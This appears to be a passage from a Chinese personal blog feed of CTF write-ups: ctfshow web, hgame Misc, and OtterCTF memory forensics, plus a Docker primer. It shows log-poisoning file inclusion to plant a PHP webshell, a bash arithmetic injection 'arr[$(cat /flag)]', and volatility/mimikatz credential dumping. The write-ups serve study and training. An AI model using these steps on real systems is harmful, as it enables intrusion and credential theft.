class="literal">FALSE</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$ctf</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>include()这里想办法包含进去</p><p>这题不太懂，先放这里，是利用<a href="https://blog.csdn.net/lza20001103/article/details/124458273">日志文件进行一句话木马</a>并成功包含的</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230129220917556.png" alt="image-20230129220917556"></p><p>先到index.php改user-agent为一句话木马让日志记录再包含日志文件写入木马</p><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?isVIP=<span class="literal">true</span></span><br><span class="line">ctf=/<span class="keyword">var</span>/log/nginx/access.log&amp;<span class="number">1</span>=<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure></div><h1 id="web150-1"><a href="#web150-1" class="headerlink" title="web150+"></a>web150+</h1><p>这题不允许包含日志文件了</p><p>需要注意__autoload()函数不是类里面的</p><div class="highlight-wrap" data-rel="Swift"><figure class="iseeu highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__autoload — 尝试加载未定义的类</span><br><span class="line">最后构造<span class="operator">?</span><span class="operator">..</span><span class="type">CTFSHOW</span><span class="operator">..=</span>phpinfo就可以看到phpinfo信息啦</span><br><span class="line">原因是<span class="operator">..</span><span class="type">CTFSHOW</span><span class="operator">..</span>解析变量成__CTFSHOW__然后进行了变量覆盖，因为<span class="type">CTFSHOW是类就会使用</span></span><br><span class="line">__autoload()函数方法，去加载，因为等于phpinfo就会去加载phpinfo</span><br></pre></td></tr></table></figure></div><p>flag在环境变量里</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023hgame_Misc方向题解</title>
      <link href="/2023/01/12/hgame2023/"/>
      <url>/2023/01/12/hgame2023/</url>
      
        <content type="html"><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Where-am-I"><a href="#Where-am-I" class="headerlink" title="Where am I"></a>Where am I</h2><p>流量分析可提取一个伪加密的压缩包，打开得到保存有exif的图片。放到MagicExif查看经纬度信息即可</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230111215547671.png" alt="image-20230111215547671"></p><h2 id="神秘的海报"><a href="#神秘的海报" class="headerlink" title="神秘的海报"></a>神秘的海报</h2><p>lsb+steghide</p><p>用stegsolve和stegseek即可</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230111215721908.png" alt="image-20230111215721908"></p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230111215631142.png" alt="image-20230111215631142"></p><h2 id="e99p1ant-want-girlfriend"><a href="#e99p1ant-want-girlfriend" class="headerlink" title="e99p1ant_want_girlfriend"></a>e99p1ant_want_girlfriend</h2><p>改一下高就行，也可以爆破正确crc的图片</p><h2 id="Tetris-Master"><a href="#Tetris-Master" class="headerlink" title="Tetris Master"></a>Tetris Master</h2><p>ssh连接后，ctrl+c可以退出游戏回到shell，从而cat &#x2F;flag实现非预期</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230221090105097.png" alt="image-20230221090105097"></p><h2 id="Sign-In-Pro-Max"><a href="#Sign-In-Pro-Max" class="headerlink" title="Sign In Pro Max"></a>Sign In Pro Max</h2><p>简单的base编码和md5在线破解，只是需要注意uuid的格式{8-4-4-4-12}</p><h2 id="crazy-qrcode"><a href="#crazy-qrcode" class="headerlink" title="crazy_qrcode"></a>crazy_qrcode</h2><p>在线网站qr-box可以梭</p><p>得到图片用ppt拼一下</p><h2 id="Tetris-Master-Revenge"><a href="#Tetris-Master-Revenge" class="headerlink" title="Tetris Master Revenge"></a>Tetris Master Revenge</h2><p><a href="https://www.gnu.org/software/bash/manual/bash.html#Shell-Arithmetic">参考</a></p><p>如果有arg1和arg2,会被当作arithmetic expressions（算术表达式）这里存在⼀个数组内命令执行的Trick。可以在询问是否是tetris master时，输入 arr[$(cat&#x2F;flag)] ，并且让游戏结束，这时候数组的索引为 $(cat &#x2F;flag) ，作为数组索引会报错，但是命令执行的结果会被输⼊到标准输出中，来实现RCE。</p><p>连上后输入n，输入target score为<code>arr[$(cat /flag)]</code> 。读入 <code>target</code> 值进入 <code>paint_game_over()</code> 内，比较时 <code>[[]]</code> 操作符会造成RCE。开游戏，结束后命令会以报错的形式执行显示出来。</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230221091104117.png" alt="image-20230221091104117"></p><h2 id="Tunnel"><a href="#Tunnel" class="headerlink" title="Tunnel"></a>Tunnel</h2><p>非预期直接查找关键字</p><h2 id="Tunnel-Revange"><a href="#Tunnel-Revange" class="headerlink" title="Tunnel Revange"></a>Tunnel Revange</h2><p>上<a href="https://crazymanarmy.github.io/2023/01/31/Hgame-2023-week3-Tunnel-&&-Tunnel-Revenge-Writeup-CN/">链接</a>，给空白磕一个</p><h2 id="ezWin-variables"><a href="#ezWin-variables" class="headerlink" title="ezWin - variables"></a>ezWin - variables</h2><p>内存取证，但是必须要使用vol3，对于vol3的使用还是比较少的，记录一下</p><p>查询基本信息</p><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 vol.py -f 1.vmem windows.info </span><br></pre></td></tr></table></figure></div><p>根据题目名称，结合grep查询环境变量</p><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 vol.py -f 1.vmem windows.envar | grep hgame</span><br></pre></td></tr></table></figure></div><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230208091631883.png" alt="image-20230208091631883"></p><h2 id="ezWin-auth"><a href="#ezWin-auth" class="headerlink" title="ezWin - auth"></a>ezWin - auth</h2><p>先使用cmdline查看命令行记录</p><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 vol.py -f 1.vmem windows.cmdline</span><br></pre></td></tr></table></figure></div><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230208092631375.png" alt="image-20230208092631375"></p><p>查看ntlm</p><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 vol.py -f 1.vmem windows.hashdump.Hashdump </span><br></pre></td></tr></table></figure></div><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230208131637801.png" alt="image-20230208131637801"></p><h2 id="ezWin-7zip"><a href="#ezWin-7zip" class="headerlink" title="ezWin - 7zip"></a>ezWin - 7zip</h2><p>经过上题可以看到桌面上有个flag.7z，提取</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230208132344331.png" alt="image-20230208132344331"></p><p>md5解开ntlm即密码</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2018_Otterctf</title>
      <link href="/2023/01/10/otterctf/"/>
      <url>/2023/01/10/otterctf/</url>
      
        <content type="html"><![CDATA[<h2 id="What-the-password"><a href="#What-the-password" class="headerlink" title="What the password?"></a>What the password?</h2><p>取电脑的密码</p><p>先看缓存在内存中的注册表的偏移量</p><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility_2.6_win64_standalone -f 1.vmem --profile=Win7SP1x64 hivelist</span><br></pre></td></tr></table></figure></div><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230110204319040.png" alt="image-20230110204319040"></p><p>关注到SAM(账户密码表)和system</p><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility_2.6_win64_standalone -f 1.vmem --profile=Win7SP1x64 hashdump -y 0xfffff8a000024010 -s 0xfffff8a0016d4010</span><br></pre></td></tr></table></figure></div><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230110205008754.png" alt="image-20230110205008754"></p><p>解不开md5…</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230110205129938.png" alt="image-20230110205129938"></p><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility_2.6_win64_standalone -f 1.vmem --profile=Win7SP1x64 lsadump</span><br></pre></td></tr></table></figure></div><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230110205735792.png" alt="image-20230110205735792"></p><p>算了算了passware一把梭</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230111115450555.png" alt="image-20230111115450555"></p><h2 id="General-Info"><a href="#General-Info" class="headerlink" title="General Info"></a>General Info</h2><p>win版的好像没办法装插件，用插件会更简单</p><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility_2.6_win64_standalone -f 1.vmem --profile=Win7SP1x64 netscan</span><br></pre></td></tr></table></figure></div><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230110211935091.png" alt="image-20230110211935091"></p><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility_2.6_win64_standalone -f 1.vmem --profile=&quot;Win7SP1x64&quot; printkey -o 0xfffff8a000024010 -K &quot;ControlSet001\Control\ComputerName\ComputerName&quot;</span><br></pre></td></tr></table></figure></div><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230110212109665.png" alt="image-20230110212109665"></p><p>法二：</p><p>主机网络地址：</p><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f OtterCTF.vmem --profile=Win7SP1x64 netscan</span><br></pre></td></tr></table></figure></div><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/asynccode" alt="img"></p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/asynccode" alt="img"></p><p>电脑名：</p><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py  --plugins=./volatility/plugins/ -f OtterCTF.vmem --profile=Win7SP1x64  mimikatz</span><br></pre></td></tr></table></figure></div><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/asynccode" alt="img"></p><h2 id="Play-Time"><a href="#Play-Time" class="headerlink" title="Play Time"></a>Play Time</h2><p>进程运行过会在内存中留下痕迹，查一下内存中的进程</p><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility_2.6_win64_standalone -f 1.vmem --profile=Win7SP1x64 psscan</span><br></pre></td></tr></table></figure></div><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230110212710545.png" alt="image-20230110212710545"></p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230110212740879.png" alt="image-20230110212740879"></p><p>再查网络</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230110213021513.png" alt="image-20230110213021513"></p><p>直接看还是有点费劲，要是有grep就好了qwq</p><h2 id="Name-Game"><a href="#Name-Game" class="headerlink" title="Name Game"></a>Name Game</h2><p>将游戏进程dump下来</p><p>strings提取并搜索关键字Lunar-3，下一行是用户名（不懂，猜测是虚拟内存中挨得近？</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230110220334466.png" alt="image-20230110220334466"></p><h2 id="Name-Game-2"><a href="#Name-Game-2" class="headerlink" title="Name Game 2"></a>Name Game 2</h2><p><strong>0x64 0x??{6-8} 0x40 0x06 0x??{18} 0x5a 0x0c 0x00{2}</strong></p><p>直接爆搜吧</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230110221332856.png" alt="image-20230110221332856"></p><h2 id="Silly-Rick"><a href="#Silly-Rick" class="headerlink" title="Silly Rick"></a>Silly Rick</h2><p>看粘贴板中的数据</p><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility_2.6_win64_standalone -f 1.vmem --profile=Win7SP1x64 clipboard</span><br></pre></td></tr></table></figure></div><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230110215111382.png" alt="image-20230110215111382"></p><h2 id="Hide-And-Seek"><a href="#Hide-And-Seek" class="headerlink" title="Hide And Seek"></a>Hide And Seek</h2><p>根据题目描述和进程解析以及<a href="https://howtodoninja.com/files/exe/vmware-tray-exe/vmware-tray-exe-virus-malware-uninstall-fix/">这里</a>,勒索软件可能伪装成vmware-tray.exe</p><p>pstree查看进程树（看看vmware-tray.exe的父子进程</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230110222342899.png" alt="image-20230110222342899"></p><p>虚拟机里的进程不应该由一个动画片产生，这应该是伪装进程</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230110222703615.png" alt="image-20230110222703615"></p><p>dll存放于临时目录，正常系统文件不应该在这儿吧</p><h2 id="Path-To-Glory"><a href="#Path-To-Glory" class="headerlink" title="Path To Glory"></a>Path To Glory</h2><p>扫一下父进程文件</p><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility_2.6_win64_standalone -f 1.vmem --profile=Win7SP1x64 filescan | findstr=&quot;Rick And Morty&quot;</span><br></pre></td></tr></table></figure></div><p>首先了解BT种子:</p><p>一种<a href="https://baike.baidu.com/item/%E7%94%B5%E8%84%91/124859?fromModule=lemma_inlink">电脑</a>“.<a href="https://baike.baidu.com/item/torrent/6640021?fromModule=lemma_inlink">torrent</a>”文件，装有BT（BitTorrent）下载必须的文件信息，作用相当于<a href="https://baike.baidu.com/item/HTTP/243074?fromModule=lemma_inlink">HTTP</a>下载里的<a href="https://baike.baidu.com/item/URL?fromModule=lemma_inlink">URL</a>链接。</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230110223939226.png" alt="image-20230110223939226"></p><p>提取种子文件strings即可</p><h2 id="Path-To-Glory-2"><a href="#Path-To-Glory-2" class="headerlink" title="Path To Glory 2"></a>Path To Glory 2</h2><p>导出所有chrome进程</p><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility_2.6_win64_standalone.exe -f 1.vmem --profile=Win7SP1x64 memdump -n chrome.exe -D ./chrome/</span><br></pre></td></tr></table></figure></div><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230110230506018.png" alt="image-20230110230506018"></p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230110231506046.png" alt="image-20230110231506046"></p><p>这种方式按理说肯定会有结果的，但奈何虚拟机没空间了，写不全</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230110232006992.png" alt="image-20230110232006992"></p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230110231857831.png" alt="image-20230110231857831"></p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230110232019271.png" alt="image-20230110232019271"></p><p>直接看download.exe.torrent前后的十个文件吧</p><h2 id="Bit-4-Bit"><a href="#Bit-4-Bit" class="headerlink" title="Bit 4 Bit"></a>Bit 4 Bit</h2><p>这题还是说恶意软件的，直接以可执行文件格式保存</p><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility_2.6_win64_standalone -f 1.vmem --profile=Win7SP1x64 procdump -p 3720 -D ./</span><br></pre></td></tr></table></figure></div><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230110233232962.png" alt="image-20230110233232962"></p><p>然而win版打了命令也没找到可执行文件（？</p><p>还是用linux吧</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230111001628843.png" alt="image-20230111001628843"></p><p>后来明白为什么win版的会没有可执行文件了，因为这玩意被系统杀了（win11专业版真的一言难尽</p><p>查完壳逆一下</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230111111123260.png" alt="image-20230111111123260"></p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230111110045821.png" alt="image-20230111110045821"></p><h2 id="Graphic’s-For-The-Weak"><a href="#Graphic’s-For-The-Weak" class="headerlink" title="Graphic’s For The Weak"></a>Graphic’s For The Weak</h2><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility_2.6_win64_standalone.exe -f 1.vmem --profile=Win7SP1x64 memdump -p 3720 -D ./</span><br></pre></td></tr></table></figure></div><p>分离进程中的文件</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230110203725711.png" alt="image-20230110203725711"></p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230110203737493.png" alt="image-20230110203737493"></p><h2 id="Recovery"><a href="#Recovery" class="headerlink" title="Recovery"></a>Recovery</h2><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230111111709522.png" alt="image-20230111111709522"></p><p>看到这里发送密码信息的格式，去爆搜即可</p><p>这里有一点，程序的数据是16字节小端序数据，可以过滤（.NET程序用2个字节表示一个字符串）</p><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings -el 3720.dmp | grep &#x27;WIN-LO6FAF3DTFE-Rick&#x27; -C 5</span><br></pre></td></tr></table></figure></div><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230111121225941.png" alt="image-20230111121225941"></p><p>strings用法：</p><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-a --all：扫描整个文件而不是只扫描目标文件初始化和装载段</span><br><span class="line">-f –print-file-name：在显示字符串前先显示文件名</span><br><span class="line">-n –bytes=[number]：找到并且输出所有NUL终止符序列</span><br><span class="line">- ：设置显示的最少的字符数，默认是4个字符</span><br><span class="line">-t --radix=&#123;o,d,x&#125; ：输出字符的位置，基于八进制，十进制或者十六进制</span><br><span class="line">-o ：类似--radix=o</span><br><span class="line">-T --target= ：指定二进制文件格式</span><br><span class="line">-e --encoding=&#123;s,S,b,l,B,L&#125; ：选择字符大小和排列顺序:s = 7-bit, S = 8-bit, &#123;b,l&#125; = 16-bit, &#123;B,L&#125; = 32-bit</span><br><span class="line">@ ：读取中选项</span><br></pre></td></tr></table></figure></div><h2 id="Closure"><a href="#Closure" class="headerlink" title="Closure"></a>Closure</h2><p>解密</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230111121814099.png" alt="image-20230111121814099"></p><p>grep用法：</p><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">-a 或 --text : 不要忽略二进制的数据。</span><br><span class="line">-A&lt;显示行数&gt; 或 --after-context=&lt;显示行数&gt; : 除了显示符合范本样式的那一列之外，并显示该行之后的内容。</span><br><span class="line">-b 或 --byte-offset : 在显示符合样式的那一行之前，标示出该行第一个字符的编号。</span><br><span class="line">-B&lt;显示行数&gt; 或 --before-context=&lt;显示行数&gt; : 除了显示符合样式的那一行之外，并显示该行之前的内容。</span><br><span class="line">-c 或 --count : 计算符合样式的列数。</span><br><span class="line">-C&lt;显示行数&gt; 或 --context=&lt;显示行数&gt;或-&lt;显示行数&gt; : 除了显示符合样式的那一行之外，并显示该行之前后的内容。</span><br><span class="line">-d &lt;动作&gt; 或 --directories=&lt;动作&gt; : 当指定要查找的是目录而非文件时，必须使用这项参数，否则grep指令将回报信息并停止动作。</span><br><span class="line">-e&lt;范本样式&gt; 或 --regexp=&lt;范本样式&gt; : 指定字符串做为查找文件内容的样式。</span><br><span class="line">-E 或 --extended-regexp : 将样式为延伸的正则表达式来使用。</span><br><span class="line">-f&lt;规则文件&gt; 或 --file=&lt;规则文件&gt; : 指定规则文件，其内容含有一个或多个规则样式，让grep查找符合规则条件的文件内容，格式为每行一个规则样式。</span><br><span class="line">-F 或 --fixed-regexp : 将样式视为固定字符串的列表。</span><br><span class="line">-G 或 --basic-regexp : 将样式视为普通的表示法来使用。</span><br><span class="line">-h 或 --no-filename : 在显示符合样式的那一行之前，不标示该行所属的文件名称。</span><br><span class="line">-H 或 --with-filename : 在显示符合样式的那一行之前，表示该行所属的文件名称。</span><br><span class="line">-i 或 --ignore-case : 忽略字符大小写的差别。</span><br><span class="line">-l 或 --file-with-matches : 列出文件内容符合指定的样式的文件名称。</span><br><span class="line">-L 或 --files-without-match : 列出文件内容不符合指定的样式的文件名称。</span><br><span class="line">-n 或 --line-number : 在显示符合样式的那一行之前，标示出该行的列数编号。</span><br><span class="line">-o 或 --only-matching : 只显示匹配PATTERN 部分。</span><br><span class="line">-q 或 --quiet或--silent : 不显示任何信息。</span><br><span class="line">-r 或 --recursive : 此参数的效果和指定&quot;-d recurse&quot;参数相同。</span><br><span class="line">-s 或 --no-messages : 不显示错误信息。</span><br><span class="line">-v 或 --invert-match : 显示不包含匹配文本的所有行。</span><br><span class="line">-V 或 --version : 显示版本信息。</span><br><span class="line">-w 或 --word-regexp : 只显示全字符合的列。</span><br><span class="line">-x --line-regexp : 只显示全列符合的列。</span><br><span class="line">-y : 此参数的效果和指定&quot;-i&quot;参数相同。</span><br></pre></td></tr></table></figure></div><p>这里桌面上还有个文件</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230111122100939.png" alt="image-20230111122100939"></p><p>都提取</p><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 dumpfiles -Q 0x000000007e410890 -D ./</span><br></pre></td></tr></table></figure></div><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230111122241218.png" alt="image-20230111122241218"></p><p>另一个文件属于提示</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230111122341497.png" alt="image-20230111122341497"></p><p>之前的图片中有这样一个字符串</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230111122433271.png" alt="image-20230111122433271"></p><p>可以看看这篇<a href="https://www.2-viruses.com/remove-ucylocker-virus">文章</a></p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230111122638933.png" alt="image-20230111122638933"></p><p>逆向的过程中也看到了hidden_tear</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230111122902847.png" alt="image-20230111122902847"></p><p><a href="https://www.spywareremove.com/removeucylockerransomware.html">搜索</a>可知这是有联系的</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230111123126591.png" alt="image-20230111123126591"></p><p>用hidden_tear解密软件解密</p><p>解密变种的软件看了wp（没搜到，我是fw</p><p>加密代码是采用CBC模式进行加密，会对文件进行填充，还要把多余的00删掉再解</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230111203437261.png" alt="image-20230111203437261"></p>]]></content>
      
      
      <categories>
          
          <category> 电子取证 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker知识点</title>
      <link href="/2022/12/30/docker/"/>
      <url>/2022/12/30/docker/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><h2 id="docker的由来"><a href="#docker的由来" class="headerlink" title="docker的由来"></a>docker的由来</h2><p>Docker的思想来自于集装箱，集装箱解决了什么问题？在一艘大船上，可以把货物规整的摆放起来。并且各种各样的货物被集装箱标准化了，集装箱和集装箱之间不会互相影响。那么我就不需要专门运送水果的船和专门运送化学品的船了。只要这些货物在集装箱里封装的好好的，那我就可以用一艘大船把他们都运走。</p><h2 id="docker与传统虚拟机的区别"><a href="#docker与传统虚拟机的区别" class="headerlink" title="docker与传统虚拟机的区别"></a>docker与传统虚拟机的区别</h2><p>传统虚拟机技术是虚拟出一套硬件后，在其上运行一个完整操作系统，在该系统上再运行所需应用进程；</p><p>而容器内的应用进程直接运行于宿主的内核，容器内没有自己的内核，而且也没有进行硬件虚拟。因此容器要比传统虚拟机更为轻便。</p><p>每个容器之间互相隔离，每个容器有自己的文件系统 ，容器之间进程不会相互影响，能区分计算资源。</p><h2 id="相关网站"><a href="#相关网站" class="headerlink" title="相关网站"></a>相关网站</h2><p>Docker官网：<a href="http://www.docker.com/">http://www.docker.com</a></p><p>Docker中文网站：<a href="https://www.docker-cn.com/">https://www.docker-cn.com</a></p><p>Docker Hub官网：<a href="https://hub.docker.com/">https://hub.docker.com</a> </p><h1 id="docker的基本组成"><a href="#docker的基本组成" class="headerlink" title="docker的基本组成"></a>docker的基本组成</h1><h2 id="构架图"><a href="#构架图" class="headerlink" title="构架图"></a>构架图</h2><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20221228154551534.png" alt="image-20221228154551534"></p><h2 id="镜像"><a href="#镜像" class="headerlink" title="镜像"></a>镜像</h2><p>Docker 镜像（Image）就是一个只读的模板。镜像可以用来创建 Docker 容器，一个镜像可以创建很多容器。 就好似 Java 中的 类和对象，类就是镜像，容器就是对象。</p><h2 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h2><p>Docker 利用容器（Container）独立运行的一个或一组应用。容器是用镜像创建的运行实例。</p><p>它可以被启动、开始、停止、删除。每个容器都是相互隔离的，保证安全的平台。</p><p>可以把容器看做是一个简易版的 Linux 环境（包括root用户权限、进程空间、用户空间和网络空间等）和运行在其中的应用程序。</p><p>容器的定义和镜像几乎一模一样，也是一堆层的统一视角，唯一区别在于容器的最上面那一层是可读可写的。</p><h2 id="仓库"><a href="#仓库" class="headerlink" title="仓库"></a>仓库</h2><p>仓库（Repository）是集中存放镜像文件的场所。</p><p>仓库(Repository)和仓库注册服务器（Registry）是有区别的。仓库注册服务器上往往存放着多个仓库，每个仓库中又包含了多个镜像，每个镜像有不同的标签（tag）。</p><p>仓库分为公开仓库（Public）和私有仓库（Private）两种形式。</p><h2 id="底层原理"><a href="#底层原理" class="headerlink" title="底层原理"></a>底层原理</h2><p>Docker是一个<strong>Client-Server</strong>结构的系统，Docker守护进程运行在主机上， 然后通过Socket连接从客户端访问，守护进程从客户端接受命令并管理运行在主机上的容器。 容器，是一个运行时环境，就是我们前面说到的集装箱。</p><h3 id="docker更快的原因"><a href="#docker更快的原因" class="headerlink" title="docker更快的原因"></a>docker更快的原因</h3><p>1、docker有着比虚拟机更少的抽象层。由亍docker不需要Hypervisor实现硬件资源虚拟化,运行在docker容器上的程序直接使用的都是实际物理机的硬件资源。因此在CPU、内存利用率上docker将会在效率上有明显优势。</p><p>2、docker利用的是宿主机的内核,而不需要Guest OS。因此,当新建一个容器时,docker不需要和虚拟机一样重新加载一个操作系统内核。仍而避免引寻、加载操作系统内核返个比较费时费资源的过程,当新建一个虚拟机时,虚拟机软件需要加载Guest 